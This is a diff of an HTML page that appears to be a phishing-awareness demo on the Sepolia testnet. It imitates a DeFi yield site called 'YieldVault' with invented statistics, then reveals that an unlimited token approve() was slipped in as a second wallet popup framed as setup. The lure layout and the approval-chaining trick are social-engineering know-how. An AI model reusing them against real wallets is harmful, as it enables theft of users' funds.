@@ -7,7 +7,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
   :root {
     --bg: #06060a;
     --surface: #0e0e18;
@@ -21,756 +20,298 @@
     --muted: #6b6b8a;
     --card: #111120;
   }
-
-  body {
-    font-family: 'Inter', sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    min-height: 100vh;
-    line-height: 1.5;
-  }
-
-  /* ---- PHASES ---- */
+  body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.5; }
   .phase { display: none; }
   .phase.active { display: block; }
 
-  /* ============================
-     PHASE 1 — LURE
-  ============================ */
-  #phase-lure {
-    min-height: 100vh;
-  }
-
-  nav {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 20px 48px;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .logo {
-    font-size: 1.1rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    color: var(--text);
-  }
-
+  /* NAV */
+  nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
+  .logo { font-size: 1.1rem; font-weight: 700; letter-spacing: -0.02em; }
   .logo span { color: var(--accent); }
+  .nav-links { display: flex; gap: 32px; list-style: none; color: var(--muted); font-size: 0.875rem; }
 
-  .nav-links {
-    display: flex;
-    gap: 32px;
-    list-style: none;
-    color: var(--muted);
-    font-size: 0.875rem;
-  }
-
-  .hero {
-    max-width: 720px;
-    margin: 0 auto;
-    padding: 100px 24px 60px;
-    text-align: center;
-  }
-
-  .badge {
-    display: inline-block;
-    background: var(--accent-dim);
-    color: var(--accent);
-    font-size: 0.75rem;
-    font-weight: 600;
-    padding: 4px 12px;
-    border-radius: 100px;
-    border: 1px solid rgba(108,99,255,0.25);
-    margin-bottom: 28px;
-    letter-spacing: 0.04em;
-  }
-
-  h1 {
-    font-size: clamp(2.2rem, 5vw, 3.4rem);
-    font-weight: 700;
-    letter-spacing: -0.03em;
-    line-height: 1.1;
-    margin-bottom: 20px;
-  }
-
-  h1 em {
-    font-style: normal;
-    color: var(--accent);
-  }
-
-  .hero-sub {
-    color: var(--muted);
-    font-size: 1.05rem;
-    max-width: 480px;
-    margin: 0 auto 40px;
-  }
-
-  .stats-row {
-    display: flex;
-    justify-content: center;
-    gap: 48px;
-    margin-bottom: 48px;
-    flex-wrap: wrap;
-  }
-
+  /* PHASE 1 — LURE */
+  .hero { max-width: 720px; margin: 0 auto; padding: 100px 24px 60px; text-align: center; }
+  .badge { display: inline-block; background: var(--accent-dim); color: var(--accent); font-size: 0.75rem; font-weight: 600; padding: 4px 12px; border-radius: 100px; border: 1px solid rgba(108,99,255,0.25); margin-bottom: 28px; letter-spacing: 0.04em; }
+  h1 { font-size: clamp(2.2rem, 5vw, 3.4rem); font-weight: 700; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 20px; }
+  h1 em { font-style: normal; color: var(--accent); }
+  .hero-sub { color: var(--muted); font-size: 1.05rem; max-width: 480px; margin: 0 auto 40px; }
+  .stats-row { display: flex; justify-content: center; gap: 48px; margin-bottom: 48px; flex-wrap: wrap; }
   .stat-item { text-align: center; }
-
-  .stat-value {
-    font-size: 1.6rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-  }
-
-  .stat-label {
-    font-size: 0.78rem;
-    color: var(--muted);
-    margin-top: 2px;
-  }
-
-  .cta-btn {
-    background: var(--accent);
-    color: white;
-    border: none;
-    padding: 14px 32px;
-    border-radius: 10px;
-    font-size: 1rem;
-    font-weight: 600;
-    cursor: pointer;
-    font-family: inherit;
-    transition: opacity 0.15s;
-  }
-
+  .stat-value { font-size: 1.6rem; font-weight: 700; letter-spacing: -0.02em; }
+  .stat-label { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
+  .cta-btn { background: var(--accent); color: white; border: none; padding: 14px 32px; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; font-family: inherit; transition: opacity 0.15s; }
   .cta-btn:hover { opacity: 0.88; }
-  .cta-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-  .cta-note {
-    margin-top: 12px;
-    font-size: 0.78rem;
-    color: var(--muted);
-  }
-
-  .pools {
-    max-width: 900px;
-    margin: 0 auto;
-    padding: 0 24px 80px;
-  }
-
-  .pools-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 16px;
-  }
-
-  .pools-title {
-    font-size: 0.85rem;
-    font-weight: 600;
-    color: var(--muted);
-    letter-spacing: 0.04em;
-  }
-
-  .pool-row {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 18px 24px;
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    margin-bottom: 10px;
-  }
-
-  .pool-icon {
-    width: 36px;
-    height: 36px;
-    border-radius: 50%;
-    background: var(--accent-dim);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 1rem;
-    flex-shrink: 0;
-  }
-
+  .cta-note { margin-top: 12px; font-size: 0.78rem; color: var(--muted); }
+  .pools { max-width: 900px; margin: 0 auto; padding: 0 24px 80px; }
+  .pools-title { font-size: 0.85rem; font-weight: 600; color: var(--muted); letter-spacing: 0.04em; display: block; margin-bottom: 16px; }
+  .pool-row { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 18px 24px; display: flex; align-items: center; gap: 16px; margin-bottom: 10px; }
+  .pool-icon { width: 36px; height: 36px; border-radius: 50%; background: var(--accent-dim); display: flex; align-items: center; justify-content: center; font-size: 1rem; flex-shrink: 0; }
   .pool-name { font-weight: 600; font-size: 0.95rem; }
   .pool-sub { font-size: 0.78rem; color: var(--muted); }
+  .pool-apy { margin-left: auto; color: var(--green); font-weight: 700; font-size: 1rem; }
+  .pool-tvl { color: var(--muted); font-size: 0.82rem; min-width: 90px; text-align: right; }
 
-  .pool-apy {
-    margin-left: auto;
-    color: var(--green);
-    font-weight: 700;
-    font-size: 1rem;
-  }
+  /* PHASE 2 — CONNECTING */
+  #phase-connecting { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+  .connect-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 40px 36px; max-width: 400px; width: 100%; text-align: center; }
+  .connect-logo { font-size: 1.3rem; font-weight: 700; margin-bottom: 28px; }
+  .connect-logo span { color: var(--accent); }
+  .step-list { text-align: left; margin-bottom: 28px; }
+  .step-item { display: flex; align-items: flex-start; gap: 12px; padding: 12px 0; border-bottom: 1px solid var(--border); }
+  .step-item:last-child { border-bottom: none; }
+  .step-icon { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 0.8rem; font-weight: 700; margin-top: 1px; }
+  .step-icon.done { background: var(--green); color: #000; }
+  .step-icon.active { background: var(--accent); color: #fff; animation: pulse 1.2s ease-in-out infinite; }
+  .step-icon.pending { background: var(--surface); border: 1px solid var(--border); color: var(--muted); }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+  .step-text { flex: 1; }
+  .step-title { font-size: 0.9rem; font-weight: 600; }
+  .step-desc { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
+  .connect-note { font-size: 0.78rem; color: var(--muted); }
 
-  .pool-tvl {
-    color: var(--muted);
-    font-size: 0.82rem;
-    min-width: 90px;
-    text-align: right;
-  }
-
-  /* ============================
-     PHASE 2 — CONNECTING
-  ============================ */
-  #phase-connecting {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .center-card {
-    text-align: center;
-    max-width: 360px;
-    padding: 24px;
-  }
-
-  .spinner {
-    width: 48px;
-    height: 48px;
-    border: 3px solid var(--border);
-    border-top-color: var(--accent);
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-    margin: 0 auto 24px;
-  }
-
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  .connecting-title {
-    font-size: 1.1rem;
-    font-weight: 600;
-    margin-bottom: 8px;
-  }
-
-  .connecting-sub {
-    font-size: 0.85rem;
-    color: var(--muted);
-  }
-
-  /* ============================
-     PHASE 3 — FAKE DASHBOARD
-  ============================ */
-  #phase-dashboard {
-    min-height: 100vh;
-  }
-
-  .dash-nav {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 20px 48px;
-    border-bottom: 1px solid var(--border);
-  }
-
-  .wallet-chip {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 7px 14px;
-    font-size: 0.82rem;
-    font-weight: 500;
-    color: var(--muted);
-  }
-
-  .dash-body {
-    max-width: 900px;
-    margin: 48px auto;
-    padding: 0 24px;
-  }
-
-  .dash-welcome {
-    font-size: 0.85rem;
-    color: var(--muted);
-    margin-bottom: 4px;
-  }
-
-  .dash-heading {
-    font-size: 1.6rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    margin-bottom: 32px;
-  }
-
-  .dash-cards {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-    gap: 16px;
-    margin-bottom: 32px;
-  }
-
-  .dash-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 20px 22px;
-  }
-
-  .dash-card-label {
-    font-size: 0.78rem;
-    color: var(--muted);
-    margin-bottom: 8px;
-  }
-
-  .dash-card-value {
-    font-size: 1.4rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-  }
-
-  .dash-card-change {
-    font-size: 0.78rem;
-    color: var(--green);
-    margin-top: 4px;
-  }
-
-  .reveal-bar {
-    background: rgba(245,158,11,0.08);
-    border: 1px solid rgba(245,158,11,0.25);
-    border-radius: 10px;
-    padding: 16px 20px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 16px;
-    margin-bottom: 24px;
-  }
-
+  /* PHASE 3 — FAKE DASHBOARD */
+  .dash-nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
+  .wallet-chip { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 7px 14px; font-size: 0.82rem; font-weight: 500; color: var(--muted); }
+  .connected-dot { display: inline-block; width: 7px; height: 7px; background: var(--green); border-radius: 50%; margin-right: 6px; }
+  .dash-body { max-width: 900px; margin: 48px auto; padding: 0 24px; }
+  .dash-welcome { font-size: 0.85rem; color: var(--muted); margin-bottom: 4px; }
+  .dash-heading { font-size: 1.6rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 32px; }
+  .dash-cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 32px; }
+  .dash-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 22px; }
+  .dash-card-label { font-size: 0.78rem; color: var(--muted); margin-bottom: 8px; }
+  .dash-card-value { font-size: 1.4rem; font-weight: 700; letter-spacing: -0.02em; }
+  .dash-card-change { font-size: 0.78rem; color: var(--green); margin-top: 4px; }
+  .reveal-bar { background: rgba(245,158,11,0.08); border: 1px solid rgba(245,158,11,0.25); border-radius: 10px; padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; gap: 16px; margin-bottom: 24px; }
   .reveal-text { font-size: 0.88rem; color: var(--yellow); }
   .reveal-text strong { display: block; margin-bottom: 2px; }
+  .reveal-btn { background: var(--yellow); color: #000; border: none; padding: 9px 18px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; font-family: inherit; white-space: nowrap; flex-shrink: 0; }
 
-  .reveal-btn {
-    background: var(--yellow);
-    color: #000;
-    border: none;
-    padding: 9px 18px;
-    border-radius: 8px;
-    font-size: 0.85rem;
-    font-weight: 700;
-    cursor: pointer;
-    font-family: inherit;
-    white-space: nowrap;
-    flex-shrink: 0;
-  }
-
-  /* ============================
-     PHASE 4 — REVEAL
-  ============================ */
-  #phase-reveal {
-    min-height: 100vh;
-  }
-
-  .reveal-page {
-    max-width: 720px;
-    margin: 60px auto;
-    padding: 0 24px;
-  }
-
-  .reveal-header {
-    text-align: center;
-    margin-bottom: 48px;
-  }
-
-  .danger-badge {
-    display: inline-block;
-    background: rgba(239,68,68,0.1);
-    color: var(--red);
-    border: 1px solid rgba(239,68,68,0.25);
-    font-size: 0.75rem;
-    font-weight: 700;
-    padding: 4px 12px;
-    border-radius: 100px;
-    margin-bottom: 16px;
-    letter-spacing: 0.05em;
-  }
-
-  .reveal-page h2 {
-    font-size: 1.8rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    margin-bottom: 12px;
-  }
-
-  .reveal-page .sub {
-    color: var(--muted);
-    font-size: 0.95rem;
-  }
-
-  .timeline {
-    position: relative;
-    padding-left: 32px;
-    margin-bottom: 40px;
-  }
-
-  .timeline::before {
-    content: '';
-    position: absolute;
-    left: 11px;
-    top: 8px;
-    bottom: 8px;
-    width: 1px;
-    background: var(--border);
-  }
-
-  .tl-item {
-    position: relative;
-    margin-bottom: 28px;
-  }
-
-  .tl-dot {
-    position: absolute;
-    left: -28px;
-    top: 4px;
-    width: 14px;
-    height: 14px;
-    border-radius: 50%;
-    border: 2px solid var(--border);
-    background: var(--bg);
-  }
-
+  /* PHASE 4 — REVEAL */
+  .reveal-page { max-width: 760px; margin: 60px auto; padding: 0 24px 80px; }
+  .reveal-header { text-align: center; margin-bottom: 48px; }
+  .danger-badge { display: inline-block; background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.25); font-size: 0.75rem; font-weight: 700; padding: 4px 12px; border-radius: 100px; margin-bottom: 16px; letter-spacing: 0.05em; }
+  .reveal-page h2 { font-size: 1.8rem; font-weight: 700; letter-spacing: -0.02em; margin-bottom: 12px; }
+  .reveal-page .sub { color: var(--muted); font-size: 0.95rem; }
+  .timeline { position: relative; padding-left: 32px; margin-bottom: 40px; }
+  .timeline::before { content: ''; position: absolute; left: 11px; top: 8px; bottom: 8px; width: 1px; background: var(--border); }
+  .tl-item { position: relative; margin-bottom: 28px; }
+  .tl-dot { position: absolute; left: -28px; top: 4px; width: 14px; height: 14px; border-radius: 50%; border: 2px solid var(--border); background: var(--bg); }
   .tl-dot.done { background: var(--green); border-color: var(--green); }
   .tl-dot.danger { background: var(--red); border-color: var(--red); }
+  .tl-label { font-size: 0.75rem; font-weight: 600; color: var(--muted); letter-spacing: 0.04em; margin-bottom: 4px; }
+  .tl-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 4px; }
+  .tl-desc { font-size: 0.85rem; color: var(--muted); line-height: 1.6; }
+  .code-block { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #a5b4fc; margin-top: 8px; word-break: break-all; }
+  .info-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px 24px; margin-bottom: 16px; }
+  .info-card-label { font-size: 0.75rem; color: var(--muted); margin-bottom: 4px; }
+  .info-card-value { font-size: 0.9rem; font-weight: 500; word-break: break-all; }
 
-  .tl-label {
-    font-size: 0.75rem;
-    font-weight: 600;
-    color: var(--muted);
-    letter-spacing: 0.04em;
-    margin-bottom: 4px;
-  }
+  /* EXPOSURE SECTION */
+  .exposure-section { margin-bottom: 32px; }
+  .exposure-header { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 16px; }
+  .exposure-title { font-size: 1rem; font-weight: 700; }
+  .exposure-sub { font-size: 0.8rem; color: var(--muted); }
+  .token-exposure-row { background: var(--card); border: 1px solid rgba(239,68,68,0.2); border-radius: 10px; padding: 16px 20px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
+  .token-exposure-left { display: flex; align-items: center; gap: 12px; }
+  .token-avatar { width: 36px; height: 36px; border-radius: 50%; background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: var(--red); flex-shrink: 0; }
+  .token-name { font-weight: 600; font-size: 0.9rem; }
+  .token-addr { font-size: 0.75rem; color: var(--muted); font-family: monospace; }
+  .token-balance-right { text-align: right; }
+  .token-balance { font-weight: 700; font-size: 0.95rem; font-variant-numeric: tabular-nums; }
+  .token-status { font-size: 0.75rem; color: var(--red); margin-top: 2px; }
+  .token-status.safe { color: var(--green); }
+  .exposure-loading { text-align: center; padding: 24px; color: var(--muted); font-size: 0.85rem; }
+  .exposure-empty { text-align: center; padding: 24px; color: var(--muted); font-size: 0.85rem; }
+  .total-bar { background: rgba(239,68,68,0.06); border: 1px solid rgba(239,68,68,0.2); border-radius: 10px; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+  .total-bar-label { font-size: 0.85rem; color: var(--muted); }
+  .total-bar-value { font-size: 1rem; font-weight: 700; color: var(--red); }
 
-  .tl-title {
-    font-size: 0.95rem;
-    font-weight: 600;
-    margin-bottom: 4px;
-  }
-
-  .tl-desc {
-    font-size: 0.85rem;
-    color: var(--muted);
-    line-height: 1.6;
-  }
-
-  .code-block {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 12px 16px;
-    font-family: 'Courier New', monospace;
-    font-size: 0.8rem;
-    color: #a5b4fc;
-    margin-top: 8px;
-    word-break: break-all;
-  }
-
-  .info-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 20px 24px;
-    margin-bottom: 16px;
-  }
-
-  .info-card-label {
-    font-size: 0.75rem;
-    color: var(--muted);
-    margin-bottom: 4px;
-  }
-
-  .info-card-value {
-    font-size: 0.9rem;
-    font-weight: 500;
-    word-break: break-all;
-  }
-
-  .balance-watcher {
-    background: rgba(239,68,68,0.06);
-    border: 1px solid rgba(239,68,68,0.2);
-    border-radius: 12px;
-    padding: 24px;
-    margin-bottom: 24px;
-    text-align: center;
-  }
-
-  .balance-label {
-    font-size: 0.8rem;
-    color: var(--muted);
-    margin-bottom: 8px;
-  }
-
-  .balance-value {
-    font-size: 2rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    font-variant-numeric: tabular-nums;
-    transition: color 0.4s;
-  }
-
+  /* BALANCE WATCHER */
+  .balance-watcher { background: rgba(239,68,68,0.06); border: 1px solid rgba(239,68,68,0.2); border-radius: 12px; padding: 24px; margin-bottom: 24px; text-align: center; }
+  .balance-label { font-size: 0.8rem; color: var(--muted); margin-bottom: 8px; }
+  .balance-value { font-size: 2rem; font-weight: 700; letter-spacing: -0.02em; font-variant-numeric: tabular-nums; transition: color 0.4s; }
   .balance-value.drained { color: var(--red); }
   .balance-value.safe { color: var(--green); }
+  .balance-note { font-size: 0.8rem; color: var(--muted); margin-top: 8px; line-height: 1.6; }
+  .refresh-btn { margin-top: 14px; background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 8px 18px; border-radius: 8px; font-size: 0.82rem; font-family: inherit; cursor: pointer; }
+  .etherscan-link { display: inline-flex; align-items: center; gap: 6px; font-size: 0.82rem; color: var(--accent); text-decoration: none; margin-top: 8px; }
 
-  .balance-note {
-    font-size: 0.8rem;
-    color: var(--muted);
-    margin-top: 8px;
-  }
-
-  .refresh-btn {
-    margin-top: 14px;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    color: var(--text);
-    padding: 8px 18px;
-    border-radius: 8px;
-    font-size: 0.82rem;
-    font-family: inherit;
-    cursor: pointer;
-  }
-
-  .etherscan-link {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 0.82rem;
-    color: var(--accent);
-    text-decoration: none;
-    margin-top: 8px;
-  }
-
-  .defense-section {
-    background: rgba(34,197,94,0.06);
-    border: 1px solid rgba(34,197,94,0.2);
-    border-radius: 12px;
-    padding: 24px;
-    margin-top: 32px;
-  }
-
-  .defense-section h3 {
-    font-size: 1rem;
-    font-weight: 700;
-    color: var(--green);
-    margin-bottom: 16px;
-  }
-
-  .defense-item {
-    display: flex;
-    gap: 12px;
-    margin-bottom: 14px;
-    font-size: 0.88rem;
-  }
-
-  .defense-num {
-    color: var(--green);
-    font-weight: 700;
-    flex-shrink: 0;
-    min-width: 20px;
-  }
-
+  /* DEFENSE */
+  .defense-section { background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 12px; padding: 24px; margin-top: 32px; }
+  .defense-section h3 { font-size: 1rem; font-weight: 700; color: var(--green); margin-bottom: 16px; }
+  .defense-item { display: flex; gap: 12px; margin-bottom: 14px; font-size: 0.88rem; }
+  .defense-num { color: var(--green); font-weight: 700; flex-shrink: 0; min-width: 20px; }
   .defense-text { color: var(--muted); line-height: 1.6; }
   .defense-text strong { color: var(--text); }
-
-  a.defense-link {
-    color: var(--accent);
-    font-weight: 600;
-    text-decoration: none;
-  }
+  a.defense-link { color: var(--accent); font-weight: 600; text-decoration: none; }
 </style>
 </head>
 <body>
 
-<!-- ============================================================
-     PHASE 1: LURE — convincing DeFi landing page
-============================================================ -->
+<!-- PHASE 1: LURE -->
 <div id="phase-lure" class="phase active">
   <nav>
     <div class="logo">Yield<span>Vault</span></div>
-    <ul class="nav-links">
-      <li>Pools</li>
-      <li>Analytics</li>
-      <li>Docs</li>
-    </ul>
+    <ul class="nav-links"><li>Pools</li><li>Analytics</li><li>Docs</li></ul>
   </nav>
-
   <div class="hero">
     <div class="badge">Live on Ethereum</div>
     <h1>Put your crypto<br>to work. <em>Automatically.</em></h1>
     <p class="hero-sub">YieldVault routes your assets across the highest-yielding DeFi protocols — no manual rebalancing, no missed opportunities.</p>
-
     <div class="stats-row">
-      <div class="stat-item">
-        <div class="stat-value">$847M</div>
-        <div class="stat-label">Total Value Locked</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-value">14.8%</div>
-        <div class="stat-label">Average APY</div>
-      </div>
-      <div class="stat-item">
-        <div class="stat-value">62,400</div>
-        <div class="stat-label">Active Depositors</div>
-      </div>
+      <div class="stat-item"><div class="stat-value">$847M</div><div class="stat-label">Total Value Locked</div></div>
+      <div class="stat-item"><div class="stat-value">14.8%</div><div class="stat-label">Average APY</div></div>
+      <div class="stat-item"><div class="stat-value">62,400</div><div class="stat-label">Active Depositors</div></div>
     </div>
-
     <button class="cta-btn" id="connectBtn">Connect Wallet</button>
     <p class="cta-note">No sign-up required. Non-custodial.</p>
   </div>
-
   <div class="pools">
-    <div class="pools-header">
-      <span class="pools-title">Top Earning Pools</span>
-    </div>
-    <div class="pool-row">
-      <div class="pool-icon">🔵</div>
-      <div><div class="pool-name">USDC Vault</div><div class="pool-sub">Compound + Aave routing</div></div>
-      <div class="pool-tvl">$312M TVL</div>
-      <div class="pool-apy">12.4% APY</div>
-    </div>
-    <div class="pool-row">
-      <div class="pool-icon">🟡</div>
-      <div><div class="pool-name">ETH Boost Vault</div><div class="pool-sub">Lido + Convex routing</div></div>
-      <div class="pool-tvl">$198M TVL</div>
-      <div class="pool-apy">9.7% APY</div>
-    </div>
-    <div class="pool-row">
-      <div class="pool-icon">🟣</div>
-      <div><div class="pool-name">Stablecoin Mix</div><div class="pool-sub">Curve + Yearn routing</div></div>
-      <div class="pool-tvl">$141M TVL</div>
-      <div class="pool-apy">18.3% APY</div>
-    </div>
+    <span class="pools-title">Top Earning Pools</span>
+    <div class="pool-row"><div class="pool-icon">🔵</div><div><div class="pool-name">USDC Vault</div><div class="pool-sub">Compound + Aave routing</div></div><div class="pool-tvl">$312M TVL</div><div class="pool-apy">12.4% APY</div></div>
+    <div class="pool-row"><div class="pool-icon">🟡</div><div><div class="pool-name">ETH Boost Vault</div><div class="pool-sub">Lido + Convex routing</div></div><div class="pool-tvl">$198M TVL</div><div class="pool-apy">9.7% APY</div></div>
+    <div class="pool-row"><div class="pool-icon">🟣</div><div><div class="pool-name">Stablecoin Mix</div><div class="pool-sub">Curve + Yearn routing</div></div><div class="pool-tvl">$141M TVL</div><div class="pool-apy">18.3% APY</div></div>
   </div>
 </div>
 
-<!-- ============================================================
-     PHASE 2: CONNECTING SPINNER
-============================================================ -->
+<!-- PHASE 2: CONNECTING — framed to normalize the second popup -->
 <div id="phase-connecting" class="phase">
-  <div class="center-card">
-    <div class="spinner"></div>
-    <div class="connecting-title" id="connectingTitle">Connecting wallet...</div>
-    <div class="connecting-sub" id="connectingSub">Please approve the request in MetaMask</div>
+  <div style="min-height:100vh;display:flex;align-items:center;justify-content:center;">
+    <div class="connect-card">
+      <div class="connect-logo">Yield<span>Vault</span></div>
+      <div class="step-list" id="stepList">
+        <!-- Steps rendered by JS -->
+      </div>
+      <p class="connect-note" id="connectNote">Please confirm each step in MetaMask to continue.</p>
+    </div>
   </div>
 </div>
 
-<!-- ============================================================
-     PHASE 3: FAKE DASHBOARD (victim thinks they're connected)
-============================================================ -->
+<!-- PHASE 3: FAKE DASHBOARD -->
 <div id="phase-dashboard" class="phase">
   <div class="dash-nav">
     <div class="logo">Yield<span>Vault</span></div>
-    <div class="wallet-chip" id="walletChip">0x0000...0000</div>
+    <div class="wallet-chip"><span class="connected-dot"></span><span id="walletChip">0x0000...0000</span></div>
   </div>
   <div class="dash-body">
     <div class="reveal-bar">
       <div class="reveal-text">
-        <strong>You are now looking at an educational demo.</strong>
-        Something happened in the background when you connected. Click to find out what.
+        <strong>This is an educational security demo.</strong>
+        Something happened in the background when you "connected." Click to find out what.
       </div>
       <button class="reveal-btn" id="revealBtn">Show me what happened</button>
     </div>
     <div class="dash-welcome">Welcome back</div>
     <div class="dash-heading">Your Portfolio</div>
     <div class="dash-cards">
-      <div class="dash-card">
-        <div class="dash-card-label">Total Balance</div>
-        <div class="dash-card-value">$0.00</div>
-        <div class="dash-card-change">Connect to view</div>
-      </div>
-      <div class="dash-card">
-        <div class="dash-card-label">Earned (30d)</div>
-        <div class="dash-card-value">$0.00</div>
-        <div class="dash-card-change">—</div>
-      </div>
-      <div class="dash-card">
-        <div class="dash-card-label">Active Positions</div>
-        <div class="dash-card-value">0</div>
-        <div class="dash-card-change">—</div>
-      </div>
+      <div class="dash-card"><div class="dash-card-label">Total Balance</div><div class="dash-card-value">$0.00</div><div class="dash-card-change">Deposit to start earning</div></div>
+      <div class="dash-card"><div class="dash-card-label">Earned (30d)</div><div class="dash-card-value">$0.00</div><div class="dash-card-change">—</div></div>
+      <div class="dash-card"><div class="dash-card-label">Active Positions</div><div class="dash-card-value">0</div><div class="dash-card-change">—</div></div>
     </div>
   </div>
 </div>
 
-<!-- ============================================================
-     PHASE 4: REVEAL — what actually happened
-============================================================ -->
+<!-- PHASE 4: REVEAL -->
 <div id="phase-reveal" class="phase">
   <div class="reveal-page">
     <div class="reveal-header">
-      <div class="danger-badge">Security Demo</div>
+      <div class="danger-badge">Security Demo — Sepolia Testnet</div>
       <h2>Here's what just happened to you</h2>
-      <p class="sub">This is a controlled Sepolia testnet demonstration. No real funds were at risk. But on a real phishing site, this is exactly how it works.</p>
+      <p class="sub">No real funds at risk — this is a controlled Sepolia testnet demo. On a real phishing site, the outcome is identical with real money.</p>
     </div>
 
-    <!-- Timeline of what happened -->
+    <!-- Timeline -->
     <div class="timeline">
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 1</div>
         <div class="tl-title">You clicked "Connect Wallet"</div>
-        <div class="tl-desc">Looked normal — same button you see on every DeFi site.</div>
+        <div class="tl-desc">Normal button. Every DeFi site has one. Nothing suspicious yet.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 2</div>
-        <div class="tl-title">MetaMask popup #1 appeared — you approved</div>
-        <div class="tl-desc">This was the real connection request. Completely normal. You approved it.</div>
+        <div class="tl-title">MetaMask popup #1 — wallet connection</div>
+        <div class="tl-desc">Legitimate. Just shares your wallet address with the site. You approved it.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-label">Step 3 — This is where it happened</div>
-        <div class="tl-title">MetaMask popup #2 appeared immediately after</div>
+        <div class="tl-label">Step 3 — Where the attack happened</div>
+        <div class="tl-title">MetaMask popup #2 appeared — "Authorize vault access"</div>
         <div class="tl-desc">
-          The site immediately chained a second transaction — an <strong>unlimited token approval</strong> — right after connection, while you were still in the flow of "connecting." Most people click through it thinking it's part of the connection process.<br><br>
+          The site framed this as a required setup step — "authorize YieldVault to optimize your yields." It looked like part of connecting. But it was not.<br><br>
           What you actually signed:
-          <div class="code-block" id="approvalDecoded">approve(<span id="drainerDisplay">0x4c6015...c72e</span>, 115792089237316195423570985008687907853269984665640564039457584007913129639935)</div>
-          In plain English: <em>"Let this contract take an unlimited amount of my DEMO tokens, any time it wants, forever."</em>
+          <div class="code-block">approve(<span id="drainerDisplay">0x4c6015...c72e</span>, 115792089237316195423570985008687907853269984665640564039457584007913129639935)</div>
+          In plain English: <em>"Let this contract take an unlimited amount of my tokens, any time it wants, without asking me again — forever."</em>
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-label">Step 4</div>
         <div class="tl-title">You landed on a normal-looking dashboard</div>
-        <div class="tl-desc">Nothing looked wrong. Your wallet showed as connected. The theft was already done — silently, in the background, with no further action needed from you.</div>
+        <div class="tl-desc">Nothing looked wrong. The damage was already done, silently, in the background.</div>
       </div>
     </div>
 
-    <!-- Approval tx link -->
+    <!-- Approval tx -->
     <div class="info-card">
-      <div class="info-card-label">Your wallet address</div>
+      <div class="info-card-label">Your wallet</div>
       <div class="info-card-value" id="revealAddress">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Approval transaction (visible on Sepolia Etherscan)</div>
+      <div class="info-card-label">Approval transaction — this is on-chain, publicly visible, permanent</div>
